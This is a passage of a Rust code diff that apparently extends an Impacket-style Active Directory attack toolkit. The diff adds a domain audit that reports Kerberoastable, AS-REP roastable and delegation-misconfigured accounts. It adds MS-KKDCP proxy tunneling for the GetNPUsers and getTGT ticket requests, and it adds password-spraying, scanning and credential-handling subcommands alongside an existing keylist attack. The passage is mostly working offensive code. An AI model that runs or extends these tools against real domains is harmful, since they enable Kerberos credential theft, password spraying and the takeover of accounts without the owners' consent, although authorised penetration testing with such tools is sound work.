+    println!("\n[*] 1. Kerberoastable User Accounts (Offline TGS Cracking Risk):");
+    println!("------------------------------------------------------------------------");
+    if report.kerberoastable_accounts.is_empty() {
+        println!("    [+] No Kerberoastable user accounts detected.");
+    } else {
+        for a in &report.kerberoastable_accounts {
+            let admin_tag = if a.is_admin { " [ADMIN / HIGH-VALUE]" } else { "" };
+            println!("    [!] {}{} (SPNs: {})", a.sam_account_name, admin_tag, a.spns.join(", "));
+            println!("        DN: {}", a.dn);
+        }
+    }
+
+    // 2. AS-REP Roasting
+    println!("\n[*] 2. AS-REP Roastable Accounts (Kerberos Pre-Authentication Disabled):");
+    println!("------------------------------------------------------------------------");
+    if report.asrep_roastable_accounts.is_empty() {
+        println!("    [+] No AS-REP roastable accounts found.");
+    } else {
+        for a in &report.asrep_roastable_accounts {
+            let admin_tag = if a.is_admin { " [ADMIN / HIGH-VALUE]" } else { "" };
+            println!("    [!] {}{} (UAC: 0x{:08X})", a.sam_account_name, admin_tag, a.user_account_control);
+            println!("        DN: {}", a.dn);
+        }
+    }
+
+    // 3. AdminCount Accounts
+    println!("\n[*] 3. Protected Accounts (adminCount = 1 / AdminSDHolder Target):");
+    println!("------------------------------------------------------------------------");
+    if report.admin_count_accounts.is_empty() {
+        println!("    [+] No adminCount=1 accounts found.");
+    } else {
+        for a in &report.admin_count_accounts {
+            println!("    [*] {} (DN: {})", a.sam_account_name, a.dn);
+        }
+    }
+
+    // 4. Weak Policies
+    println!("\n[*] 4. Weak Account Password Policies:");
+    println!("------------------------------------------------------------------------");
+    if report.weak_policy_accounts.is_empty() {
+        println!("    [+] No accounts with reversible encryption or missing password requirement.");
+    } else {
+        for a in &report.weak_policy_accounts {
+            println!("    [!] {} -> Flags: [{}]", a.sam_account_name, a.flags.join(", "));
+        }
+    }
+
+    // 5. Kerberos Delegations
+    println!("\n[*] 5. Kerberos Delegation Configurations:");
+    println!("------------------------------------------------------------------------");
+    if report.delegations.is_empty() {
+        println!("    [+] No delegation configurations found.");
+    } else {
+        for d in &report.delegations {
+            match &d.delegation {
+                impacket_ldap::DelegationType::Unconstrained { is_dc } => {
+                    let dc_tag = if *is_dc { " (Domain Controller)" } else { " [!] UNCONSTRAINED RISK" };
+                    println!("    - {} : Unconstrained Delegation{}", d.sam_account_name, dc_tag);
+                }
+                impacket_ldap::DelegationType::Constrained { protocol_transition, allowed_targets } => {
+                    let trans_tag = if *protocol_transition { " [Protocol Transition / S4U2Self]" } else { "" };
+                    println!("    - {} : Constrained Delegation{} -> Targets: [{}]", d.sam_account_name, trans_tag, allowed_targets.join(", "));
+                }
+                impacket_ldap::DelegationType::ResourceBased { allowed_sids } => {
+                    println!("    - {} : RBCD configured (Allowed SIDs: {})", d.sam_account_name, allowed_sids.len());
+                }
+            }
+        }
+    }
+
+    println!("\n========================================================================");
+    println!("[*] Domain Audit Summary: {} total high-risk misconfiguration(s) discovered.", report.high_risk_finding_count());
+    println!("========================================================================");
+}
+
 fn cmd_dump_ntlm_info(args: &[String]) {
     let spec = match parse_target_with_hashes(args) {
         Ok(s) => s,
@@ -5943,6 +6840,7 @@ fn cmd_get_np_users(args: &[String]) {
         println!("Usage: GetNPUsers <DOMAIN/USER[:PASSWORD]@KDC_IP> [options]");
         println!("Options:");
         println!("  -fast <FILE>         FAST armor ticket file (.ccache or .kirbi, RFC 6113)");
+        println!("  -kdc-proxy <HOST[:PORT]> Tunnel AS-REQ via MS-KKDCP over HTTPS (port 443)");
         println!("  -dc-ip <IP>          Domain Controller IP (overrides target)");
         return;
     }
@@ -5955,12 +6853,17 @@ fn cmd_get_np_users(args: &[String]) {
     };
 
     let mut fast_file: Option<String> = None;
+    let mut kdc_proxy: Option<String> = None;
     let mut dc_ip: Option<String> = None;
     let mut i = 1;
     while i < args.len() {
         match args[i].as_str() {
             "-fast" if i + 1 < args.len() => {
                 fast_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-kdc-proxy" | "-kkdcp" if i + 1 < args.len() => {
+                kdc_proxy = Some(args[i + 1].clone());
                 i += 2;
             }
             "-dc-ip" if i + 1 < args.len() => {
@@ -6020,14 +6923,27 @@ fn cmd_get_np_users(args: &[String]) {
         return;
     }
 
-    match get_np_users_live(
-        kdc_host,
-        88,
-        &spec.domain,
-        &spec.username,
-        spec.compat_profile,
-        DEFAULT_TIMEOUT,
-    ) {
+    let resp = if let Some(proxy_addr) = &kdc_proxy {
+        let (phost, pport) = if let Some((h, p)) = proxy_addr.rsplit_once(':') {
+            (h, p.parse().unwrap_or(DEFAULT_KKDCP_PORT))
+        } else {
+            (proxy_addr.as_str(), DEFAULT_KKDCP_PORT)
+        };
+        let req = Krb5AsReq::new(&spec.domain, &spec.username, spec.compat_profile);
+        println!("[*] Tunneling GetNPUsers AS-REQ through MS-KKDCP proxy at {}:{} ({})", phost, pport, DEFAULT_KKDCP_PATH);
+        send_as_req_kkdcp_live(phost, pport, DEFAULT_KKDCP_PATH, &req, DEFAULT_TIMEOUT)
+    } else {
+        get_np_users_live(
+            kdc_host,
+            88,
+            &spec.domain,
+            &spec.username,
+            spec.compat_profile,
+            DEFAULT_TIMEOUT,
+        )
+    };
+
+    match resp {
         Ok(KdcAsResponse::Error { error_code, .. }) => {
             println!(
                 "[-] User '{}@{}': {} (code={})",
@@ -6063,6 +6979,7 @@ fn cmd_get_tgt(args: &[String]) {
         println!("  -kirbi <FILE>        Output Windows Mimikatz .kirbi file");
         println!("  -save                Save TGT to default ccache file");
         println!("  -fast <FILE>         FAST armor ticket file (.ccache or .kirbi, RFC 6113)");
+        println!("  -kdc-proxy <HOST[:PORT]> Tunnel AS-REQ via MS-KKDCP over HTTPS (port 443)");
         println!("  -dc-ip <IP>          Domain Controller IP (overrides target)");
         println!("  -port <PORT>         KDC port (default 88)");
         return;
@@ -6083,6 +7000,7 @@ fn cmd_get_tgt(args: &[String]) {
     let mut out_file: Option<String> = None;
     let mut kirbi_file: Option<String> = None;
     let mut fast_file: Option<String> = None;
+    let mut kdc_proxy: Option<String> = None;
     let mut dc_ip: Option<String> = None;
     let mut port: u16 = 88;
 
@@ -6122,6 +7040,10 @@ fn cmd_get_tgt(args: &[String]) {
             }
             "-fast" if i + 1 < args.len() => {
                 fast_file = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-kdc-proxy" | "-kkdcp" if i + 1 < args.len() => {
+                kdc_proxy = Some(args[i + 1].clone());
                 i += 2;
             }
             "-dc-ip" if i + 1 < args.len() => {
@@ -6261,6 +7183,20 @@ fn cmd_get_tgt(args: &[String]) {
             }
             Err(e) => {
                 eprintln!("[-] getTGT FAST error: {}", e);
+                std::process::exit(1);
+            }
+        }
+    } else if let Some(proxy_addr) = &kdc_proxy {
+        let (phost, pport) = if let Some((h, p)) = proxy_addr.rsplit_once(':') {
+            (h, p.parse().unwrap_or(DEFAULT_KKDCP_PORT))
+        } else {
+            (proxy_addr.as_str(), DEFAULT_KKDCP_PORT)
+        };
+        println!("[*] Tunneling AS-REQ through MS-KKDCP proxy at {}:{} ({})", phost, pport, DEFAULT_KKDCP_PATH);
+        match send_as_req_kkdcp_live(phost, pport, DEFAULT_KKDCP_PATH, &req, DEFAULT_TIMEOUT) {
+            Ok(r) => r,
+            Err(e) => {
+                eprintln!("[-] getTGT KKDCP proxy error: {}", e);
                 std::process::exit(1);
             }
         }
@@ -10051,14 +10987,10 @@ fn cmd_keylistattack(args: &[String]) {
         }
     };
 
-    let etype = rodc_etype.unwrap_or_else(|| {
-        if rodc_key.len() == 32 {
-            18
-        } else if rodc_key.len() == 16 {
-            17
-        } else {
-            18
-        }
+    let etype = rodc_etype.unwrap_or(if rodc_key.len() == 16 {
+        17
+    } else {
+        18
     });
 
     // Resolve target spec if provided
@@ -14574,6 +15506,12 @@ fn main() {
     }
 
     match args.first().map(String::as_str) {
+        Some("hosts") => cmd_hosts(&args[1..]),
+        Some("creds") | Some("credentials") => cmd_creds(&args[1..]),
+        Some("scan") | Some("prober") | Some("netexec") | Some("nxc") => cmd_scan(&args[1..]),
+        Some("cldap") | Some("cldap-ping") => cmd_cldap(&args[1..]),
+        Some("kerbrute") | Some("spray") | Some("passwordspray") => cmd_kerbrute(&args[1..]),
+        Some("audit") | Some("winpwn") => cmd_audit(&args[1..]),
         Some("DumpNTLMInfo") | Some("dump-ntlm-info") => cmd_dump_ntlm_info(&args[1..]),
         Some("GetNPUsers") | Some("get-np-users") => cmd_get_np_users(&args[1..]),
         Some("GetUserSPNs") | Some("get-user-spns") => cmd_get_user_spns(&args[1..]),
